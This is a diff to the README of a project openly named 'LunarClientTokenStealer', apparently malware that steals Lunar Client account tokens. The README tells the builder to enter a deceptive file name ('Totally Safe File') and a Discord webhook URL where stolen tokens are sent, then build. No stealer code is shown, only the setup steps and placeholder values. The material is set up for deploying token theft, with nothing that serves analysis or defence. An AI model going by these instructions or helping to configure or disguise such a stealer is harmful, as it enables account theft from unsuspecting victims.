@@ -1,8 +1,8 @@
 # LunarClientTokenStealer
 
-Fill in your application name and discord webhook URL for example:
+Fill in your application name and discord webhook URL in the code and build
 
-// Put your malware name here
+for example:
+
 String name = "Totally Safe File";
-// Put your webhook URL here
 String webhook = "https://discord.gg/webhook/url/here";
